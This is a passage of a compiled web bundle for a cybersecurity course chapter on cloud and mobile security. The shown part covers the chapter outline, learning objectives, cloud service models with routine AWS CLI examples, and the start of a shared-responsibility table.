"use strict";
(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[61612],{

/***/ 12866
(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  assets: () => (/* binding */ assets),
  contentTitle: () => (/* binding */ contentTitle),
  "default": () => (/* binding */ MDXContent),
  frontMatter: () => (/* binding */ frontMatter),
  metadata: () => (/* reexport */ site_docs_courses_cyber_security_07_cloud_mobile_md_7c1_namespaceObject),
  toc: () => (/* binding */ toc)
});

;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-07-cloud-mobile-md-7c1.json
const site_docs_courses_cyber_security_07_cloud_mobile_md_7c1_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/cloud-mobile","title":"Chapter 7: Cloud & Mobile Security","description":"Prereq: Chapter 6 (IAM) — cloud security extends IAM to cloud provider and mobile device identities.","source":"@site/docs/courses/cyber-security/07-cloud-mobile.md","sourceDirName":"courses/cyber-security","slug":"/courses/cyber-security/cloud-mobile","permalink":"/ai-engineering-journey/courses/cyber-security/cloud-mobile","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"layout":"default","title":"Chapter 7: Cloud & Mobile Security","permalink":"/cyber-security/07-cloud-mobile/"},"sidebar":"course-cyber-security","previous":{"title":"Chapter 6: Identity & Access Management","permalink":"/ai-engineering-journey/cyber-security/06-iam"},"next":{"title":"Chapter 8: Forensics & Incident Response","permalink":"/ai-engineering-journey/cyber-security/08-forensics-ir"}}');
// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
var jsx_runtime = __webpack_require__(74848);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(28453);
;// ./docs/courses/cyber-security/07-cloud-mobile.md


const frontMatter = {
	layout: 'default',
	title: 'Chapter 7: Cloud & Mobile Security',
	permalink: '/cyber-security/07-cloud-mobile/'
};
const contentTitle = 'Chapter 7: Cloud & Mobile Security';

const assets = {

};

/*End Image Gallery*/


const toc = [{
  "value": "Learning Objectives",
  "id": "learning-objectives",
  "level": 2
}, {
  "value": "Chapter at a Glance",
  "id": "chapter-at-a-glance",
  "level": 2
}, {
  "value": "Cloud Service Models",
  "id": "cloud-service-models",
  "level": 2
}, {
  "value": "1. Infrastructure as a Service (IaaS)",
  "id": "1-infrastructure-as-a-service-iaas",
  "level": 3
}, {
  "value": "2. Platform as a Service (PaaS)",
  "id": "2-platform-as-a-service-paas",
  "level": 3
}, {
  "value": "3. Software as a Service (SaaS)",
  "id": "3-software-as-a-service-saas",
  "level": 3
}, {
  "value": "Responsibility Comparison Table",
  "id": "responsibility-comparison-table",
  "level": 3
}, {
  "value": "Edge Cases",
  "id": "edge-cases",
  "level": 3
}, {
  "value": "Cloud Shared Responsibility Model",
  "id": "cloud-shared-responsibility-model",
  "level": 2
}, {
  "value": "Deep Dive — The Six Layers of Cloud Security",
  "id": "deep-dive--the-six-layers-of-cloud-security",
  "level": 3
}, {
  "value": "Virtualization Security",
  "id": "virtualization-security",
  "level": 2
}, {
  "value": "Hypervisor-Based Virtualization",
  "id": "hypervisor-based-virtualization",
  "level": 3
}, {
  "value": "Hypervisor Attack Surfaces",
  "id": "hypervisor-attack-surfaces",
  "level": 3
}, {
  "value": "VM Escape — Detailed Walkthrough",
  "id": "vm-escape--detailed-walkthrough",
  "level": 3
}, {
  "value": "VM Sprawl Security Risks",
  "id": "vm-sprawl-security-risks",
  "level": 3
}, {
  "value": "A&amp;D Table — Virtualization Security",
  "id": "ad-table--virtualization-security",
  "level": 3
}, {
  "value": "Container Security",
  "id": "container-security",
  "level": 2
}, {
  "value": "Docker Security",
  "id": "docker-security",
  "level": 3
}, {
  "value": "Docker Security Best Practices",
  "id": "docker-security-best-practices",
  "level": 3
}, {
  "value": "Trivy Container Image Scanning",
  "id": "trivy-container-image-scanning",
  "level": 3
}, {
  "value": "Docker Security — Edge Cases",
  "id": "docker-security--edge-cases",
  "level": 3
}, {
  "value": "Kubernetes Security",
  "id": "kubernetes-security",
  "level": 2
}, {
  "value": "Kubernetes Attack Surface",
  "id": "kubernetes-attack-surface",
  "level": 3
}, {
  "value": "RBAC (Role-Based Access Control)",
  "id": "rbac-role-based-access-control",
  "level": 3
}, {
  "value": "Pod Security Standards (PSS)",
  "id": "pod-security-standards-pss",
  "level": 3
}, {
  "value": "Network Policies",
  "id": "network-policies",
  "level": 3
}, {
  "value": "Secrets Management",
  "id": "secrets-management",
  "level": 3
}, {
  "value": "Admission Controllers",
  "id": "admission-controllers",
  "level": 3
}, {
  "value": "kube-bench CIS Benchmark",
  "id": "kube-bench-cis-benchmark",
  "level": 3
}, {
  "value": "Falco Runtime Security",
  "id": "falco-runtime-security",
  "level": 3
}, {
  "value": "A&amp;D Table — Container Security",
  "id": "ad-table--container-security",
  "level": 3
}, {
  "value": "Serverless Security",
  "id": "serverless-security",
  "level": 2
}, {
  "value": "How Serverless Changes the Security Model",
  "id": "how-serverless-changes-the-security-model",
  "level": 3
}, {
  "value": "OWASP Serverless Top 10",
  "id": "owasp-serverless-top-10",
  "level": 3
}, {
  "value": "Event Injection — Deep Dive",
  "id": "event-injection--deep-dive",
  "level": 3
}, {
  "value": "Edge Cases — Serverless",
  "id": "edge-cases--serverless",
  "level": 3
}, {
  "value": "Cloud Compliance",
  "id": "cloud-compliance",
  "level": 2
}, {
  "value": "CIS Benchmarks for AWS, Azure, GCP",
  "id": "cis-benchmarks-for-aws-azure-gcp",
  "level": 3
}, {
  "value": "CSPM (Cloud Security Posture Management)",
  "id": "cspm-cloud-security-posture-management",
  "level": 3
}, {
  "value": "CWPP (Cloud Workload Protection Platform)",
  "id": "cwpp-cloud-workload-protection-platform",
  "level": 3
}, {
  "value": "CASB (Cloud Access Security Broker)",
  "id": "casb-cloud-access-security-broker",
  "level": 3
}, {
  "value": "CIEM (Cloud Infrastructure Entitlement Management)",
  "id": "ciem-cloud-infrastructure-entitlement-management",
  "level": 3
}, {
  "value": "Cloud IAM Best Practices",
  "id": "cloud-iam-best-practices",
  "level": 2
}, {
  "value": "Principle #1: Least Privilege",
  "id": "principle-1-least-privilege",
  "level": 3
}, {
  "value": "IAM Policy Simulation",
  "id": "iam-policy-simulation",
  "level": 3
}, {
  "value": "IAM Access Analyzer",
  "id": "iam-access-analyzer",
  "level": 3
}, {
  "value": "Edge Cases — Cloud IAM",
  "id": "edge-cases--cloud-iam",
  "level": 3
}, {
  "value": "Cloud Data Protection",
  "id": "cloud-data-protection",
  "level": 2
}, {
  "value": "KMS (Key Management Service)",
  "id": "kms-key-management-service",
  "level": 3
}, {
  "value": "HSM (Hardware Security Module)",
  "id": "hsm-hardware-security-module",
  "level": 3
}, {
  "value": "Envelope Encryption",
  "id": "envelope-encryption",
  "level": 3
}, {
  "value": "A&amp;D Table — Cloud Data Protection",
  "id": "ad-table--cloud-data-protection",
  "level": 3
}, {
  "value": "Edge Cases — Cloud Data Protection",
  "id": "edge-cases--cloud-data-protection",
  "level": 3
}, {
  "value": "Case Study 1: Capital One 2019 — AWS SSRF Breach",
  "id": "case-study-1-capital-one-2019--aws-ssrf-breach",
  "level": 2
}, {
  "value": "Attack Timeline",
  "id": "attack-timeline",
  "level": 3
}, {
  "value": "Root Cause Analysis",
  "id": "root-cause-analysis",
  "level": 3
}, {
  "value": "Mitigation — EC2 IMDSv2 Hardening",
  "id": "mitigation--ec2-imdsv2-hardening",
  "level": 3
}, {
  "value": "Case Study 2: CodeCov 2021 — Container Misconfiguration",
  "id": "case-study-2-codecov-2021--container-misconfiguration",
  "level": 2
}, {
  "value": "Attack Flow",
  "id": "attack-flow",
  "level": 3
}, {
  "value": "Root Causes",
  "id": "root-causes",
  "level": 3
}, {
  "value": "Secure Docker Build Pipeline",
  "id": "secure-docker-build-pipeline",
  "level": 3
}, {
  "value": "Case Study 3: Kaseya VSA 2021 — REvil Ransomware via VDI/Supply Chain",
  "id": "case-study-3-kaseya-vsa-2021--revil-ransomware-via-vdisupply-chain",
  "level": 2
}, {
  "value": "Attack Timeline",
  "id": "attack-timeline-1",
  "level": 3
}, {
  "value": "Key Lessons",
  "id": "key-lessons",
  "level": 3
}, {
  "value": "Case Study 4: Pegasus (NSO Group) — FORCEDENTRY",
  "id": "case-study-4-pegasus-nso-group--forcedentry",
  "level": 2
}, {
  "value": "Technical Breakdown",
  "id": "technical-breakdown",
  "level": 3
}, {
  "value": "FORCEDENTRY Exploit Chain",
  "id": "forcedentry-exploit-chain",
  "level": 3
}, {
  "value": "iOS Security Mitigations",
  "id": "ios-security-mitigations",
  "level": 3
}, {
  "value": "Comparison: iOS vs Android Security Models",
  "id": "comparison-ios-vs-android-security-models",
  "level": 3
}, {
  "value": "Mobile Security",
  "id": "mobile-security",
  "level": 2
}, {
  "value": "Android Security Model",
  "id": "android-security-model",
  "level": 3
}, {
  "value": "iOS Security Model",
  "id": "ios-security-model",
  "level": 3
}, {
  "value": "A&amp;D Table — Android vs iOS Security",
  "id": "ad-table--android-vs-ios-security",
  "level": 3
}, {
  "value": "Edge Cases — Mobile Security",
  "id": "edge-cases--mobile-security",
  "level": 3
}, {
  "value": "OWASP Mobile Top 10",
  "id": "owasp-mobile-top-10",
  "level": 2
}, {
  "value": "M1 — Improper Credential Usage",
  "id": "m1--improper-credential-usage",
  "level": 3
}, {
  "value": "M5 — Insecure Communication Detection",
  "id": "m5--insecure-communication-detection",
  "level": 3
}, {
  "value": "M7 — Insecure Data Storage Detection",
  "id": "m7--insecure-data-storage-detection",
  "level": 3
}, {
  "value": "M2 — Supply Chain Security",
  "id": "m2--supply-chain-security",
  "level": 3
}, {
  "value": "Mobile App Security Testing",
  "id": "mobile-app-security-testing",
  "level": 2
}, {
  "value": "Android APK Decompilation with jadx",
  "id": "android-apk-decompilation-with-jadx",
  "level": 3
}, {
  "value": "iOS IPA Analysis with objection",
  "id": "ios-ipa-analysis-with-objection",
  "level": 3
}, {
  "value": "Mobile App Traffic Interception with Burp Suite",
  "id": "mobile-app-traffic-interception-with-burp-suite",
  "level": 3
}, {
  "value": "Mobile Device Management (MDM) &amp; BYOD",
  "id": "mobile-device-management-mdm--byod",
  "level": 2
}, {
  "value": "MDM Architecture",
  "id": "mdm-architecture",
  "level": 3
}, {
  "value": "BYOD (Bring Your Own Device)",
  "id": "byod-bring-your-own-device",
  "level": 3
}, {
  "value": "A&amp;D Table — BYOD Models",
  "id": "ad-table--byod-models",
  "level": 3
}, {
  "value": "Mobile Malware Analysis",
  "id": "mobile-malware-analysis",
  "level": 2
}, {
  "value": "Types of Mobile Malware",
  "id": "types-of-mobile-malware",
  "level": 3
}, {
  "value": "Mobile Malware Analysis Methodology",
  "id": "mobile-malware-analysis-methodology",
  "level": 3
}, {
  "value": "Repackaging Detection",
  "id": "repackaging-detection",
  "level": 3
}, {
  "value": "In-App Purchase / Billing Fraud",
  "id": "in-app-purchase--billing-fraud",
  "level": 3
}, {
  "value": "Practical Examples — Full Command Reference",
  "id": "practical-examples--full-command-reference",
  "level": 2
}, {
  "value": "Cloud IAM Policy Analysis",
  "id": "cloud-iam-policy-analysis",
  "level": 3
}, {
  "value": "Docker Security Audit",
  "id": "docker-security-audit",
  "level": 3
}, {
  "value": "Kubernetes Security Commands",
  "id": "kubernetes-security-commands",
  "level": 3
}, {
  "value": "Trivy Container Scanning",
  "id": "trivy-container-scanning",
  "level": 3
}, {
  "value": "Falco Runtime Detection",
  "id": "falco-runtime-detection",
  "level": 3
}, {
  "value": "Mobile App Commands",
  "id": "mobile-app-commands",
  "level": 3
}, {
  "value": "Interview Corner",
  "id": "interview-corner",
  "level": 2
}, {
  "value": "Cloud Security Interview Q&amp;A",
  "id": "cloud-security-interview-qa",
  "level": 3
}, {
  "value": "Container &amp; Kubernetes Interview Q&amp;A",
  "id": "container--kubernetes-interview-qa",
  "level": 3
}, {
  "value": "Mobile Security Interview Q&amp;A",
  "id": "mobile-security-interview-qa",
  "level": 3
}, {
  "value": "Applications in Real Systems",
  "id": "applications-in-real-systems",
  "level": 2
}, {
  "value": "Practical Takeaways",
  "id": "practical-takeaways",
  "level": 2
}, {
  "value": "Summary",
  "id": "summary",
  "level": 2
}, {
  "value": "Exercises",
  "id": "exercises",
  "level": 2
}, {
  "value": "Review Questions",
  "id": "review-questions",
  "level": 3
}, {
  "value": "Application Problems",
  "id": "application-problems",
  "level": 3
}, {
  "value": "Challenge Problems",
  "id": "challenge-problems",
  "level": 3
}, {
  "value": "Concept Comparison",
  "id": "concept-comparison",
  "level": 3
}, {
  "value": "Cross-Application Matrix",
  "id": "cross-application-matrix",
  "level": 3
}, {
  "value": "Chapter Quiz",
  "id": "chapter-quiz",
  "level": 2
}, {
  "value": "TypeScript Implementations",
  "id": "typescript-implementations",
  "level": 2
}, {
  "value": "Cloud Security Posture Scanner",
  "id": "cloud-security-posture-scanner",
  "level": 3
}, {
  "value": "Container Security Scanner",
  "id": "container-security-scanner",
  "level": 3
}, {
  "value": "Mermaid Diagrams",
  "id": "mermaid-diagrams",
  "level": 2
}, {
  "value": "Cloud Shared Responsibility Model",
  "id": "cloud-shared-responsibility-model-1",
  "level": 3
}, {
  "value": "Mobile App Sandbox Architecture",
  "id": "mobile-app-sandbox-architecture",
  "level": 3
}, {
  "value": "Further Reading",
  "id": "further-reading",
  "level": 2
}];
function _createMdxContent(props) {
  const _components = {
    a: "a",
    blockquote: "blockquote",
    code: "code",
    details: "details",
    em: "em",
    h1: "h1",
    h2: "h2",
    h3: "h3",
    header: "header",
    hr: "hr",
    img: "img",
    li: "li",
    ol: "ol",
    p: "p",
    pre: "pre",
    section: "section",
    span: "span",
    strong: "strong",
    summary: "summary",
    table: "table",
    tbody: "tbody",
    td: "td",
    th: "th",
    thead: "thead",
    tr: "tr",
    ul: "ul",
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
    children: [(0,jsx_runtime.jsx)(_components.header, {
      children: (0,jsx_runtime.jsx)(_components.h1, {
        id: "chapter-7-cloud--mobile-security",
        children: "Chapter 7: Cloud & Mobile Security"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Prereq:"
        }), " Chapter 6 (IAM) — cloud security extends IAM to cloud provider and mobile device identities.\n", (0,jsx_runtime.jsx)(_components.strong, {
          children: "Next:"
        }), " Chapter 8 (Forensics & IR) — incident response in cloud and mobile environments requires specialised processes."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "learning-objectives",
      children: "Learning Objectives"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the Shared Responsibility Model across IaaS/PaaS/SaaS with concrete boundaries."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Analyze hypervisor attack surfaces (VM escape, VM sprawl) and container security controls (seccomp, AppArmor, Pod Security Standards)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement Docker and Kubernetes security best practices including RBAC, network policies, and admission controllers."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Audit cloud environments using CIS benchmarks, CSPM, CWPP, CASB, and CIEM frameworks."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Evaluate mobile OS security models (Android SELinux, iOS sandbox, entitlements, code signing)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Apply OWASP Mobile Top 10 mitigations and perform mobile app security testing (APK decompilation, IPA analysis, traffic interception)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Analyze real-world cloud and mobile breaches (Capital One 2019, CodeCov 2021, Kaseya 2021, Pegasus FORCEDENTRY)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.section, {
      className: "lesson-visuals",
      "aria-label": "Visual learning resources",
      children: ["\n  ", (0,jsx_runtime.jsxs)(_components.header, {
        children: [(0,jsx_runtime.jsx)(_components.span, {
          children: "VISUAL LEARNING"
        }), (0,jsx_runtime.jsx)(_components.h2, {
          children: "See it. Review it. Remember it."
        })]
      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
        className: "lesson-visual-card",
        href: "../../assets/images/lessons/cyber-security/07-cloud-mobile/handwritten-notes.png",
        target: "_blank",
        rel: "noopener",
        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
          src: "../../assets/images/lessons/cyber-security/07-cloud-mobile/handwritten-notes.png",
          alt: "Handwritten notes",
          loading: "lazy"
        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Handwritten notes"
          }), "Condensed notes for deliberate review."]
        }), "\n  "]
      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
        className: "lesson-visual-card",
        href: "../../assets/images/lessons/cyber-security/07-cloud-mobile/sticky-notes.png",
        target: "_blank",
        rel: "noopener",
        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
          src: "../../assets/images/lessons/cyber-security/07-cloud-mobile/sticky-notes.png",
          alt: "Sticky-note revision",
          loading: "lazy"
        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Sticky-note revision"
          }), "Fast recall prompts for revision."]
        }), "\n  "]
      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
        className: "lesson-visual-card",
        href: "../../assets/images/lessons/cyber-security/07-cloud-mobile/visual-explanation.png",
        target: "_blank",
        rel: "noopener",
        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
          src: "../../assets/images/lessons/cyber-security/07-cloud-mobile/visual-explanation.png",
          alt: "Visual concept guide",
          loading: "lazy"
        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Visual concept guide"
          }), "A connected explanation of the key ideas."]
        }), "\n  "]
      }), "\n"]
    }), "\n", "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-at-a-glance",
      children: "Chapter at a Glance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Section"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Concept"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Why It Matters"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Service Models"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IaaS/PaaS/SaaS shared responsibility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Know exactly what YOU must secure"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Virtualization Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hypervisor, VM escape, VM sprawl"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Isolation boundaries in multi-tenant cloud"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Container Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Docker benchmarks, K8s RBAC, Falco"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Default container posture is insecure"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Serverless Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP Serverless Top 10, event injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "New attack surface: function-as-a-service"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CIS benchmarks, CSPM/CWPP/CASB/CIEM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated posture management at scale"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile OS Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SELinux, sandbox, entitlements, code signing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iOS vs Android threat models differ"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile App Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP Mobile Top 10, app vetting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure storage and communication dominate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MDM/BYOD"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Device management, app management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Privacy vs. corporate data protection tension"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart LR\n    subgraph Cloud\n        A[Shared Responsibility] --> B[IaaS/PaaS/SaaS]\n        B --> C[Virtualization]\n        C --> D[Containers]\n        D --> E[Serverless]\n    end\n    subgraph Mobile\n        F[OS Security Models] --> G[App Sandboxing]\n        G --> H[MDM/MAM]\n        H --> I[BYOD]\n    end\n    style A fill:#e1f5fe\n    style F fill:#fff3e0\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "cloud-service-models",
      children: "Cloud Service Models"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "1-infrastructure-as-a-service-iaas",
      children: "1. Infrastructure as a Service (IaaS)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Renting an apartment — the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "What YOU secure:"
      }), " Applications, data, runtime, OS, middleware, network config (security groups, ACLs).\n", (0,jsx_runtime.jsx)(_components.strong, {
        children: "What provider secures:"
      }), " Physical datacenter, hardware, storage, networking, hypervisor."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example — AWS EC2:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# IaaS — you manage the AMI, OS patches, firewall rules\naws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.large --security-group-ids sg-12345\naws ec2 create-security-group --group-name web-sg --description \"Web tier security group\"\naws ec2 authorize-security-group-ingress --group-name web-sg --protocol tcp --port 443 --cidr 0.0.0.0/0\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "2-platform-as-a-service-paas",
      children: "2. Platform as a Service (PaaS)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Renting a fully furnished apartment — the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "What YOU secure:"
      }), " Application code, data, access configuration (IAM, secrets).\n", (0,jsx_runtime.jsx)(_components.strong, {
        children: "What provider secures:"
      }), " Runtime, middleware, OS, hypervisor, hardware, networking."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example — AWS Elastic Beanstalk:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# PaaS — provider handles OS, runtime, web server\naws elasticbeanstalk create-application --application-name my-app\naws elasticbeanstalk create-environment --application-name my-app --environment-name prod --solution-stack-name \"64bit Amazon Linux 2 v5.8.4 running Node.js 18\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "3-software-as-a-service-saas",
      children: "3. Software as a Service (SaaS)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Staying at a hotel — everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "What YOU secure:"
      }), " Data classification, user access management (IAM), client-side security.\n", (0,jsx_runtime.jsx)(_components.strong, {
        children: "What provider secures:"
      }), " Everything below data — application, runtime, OS, middleware, hardware, networking."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "responsibility-comparison-table",
      children: "Responsibility Comparison Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Resource"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "On-Premises"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "IaaS"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "PaaS"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "SaaS"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Applications"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Middleware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Virtualization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Servers/Storage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider"
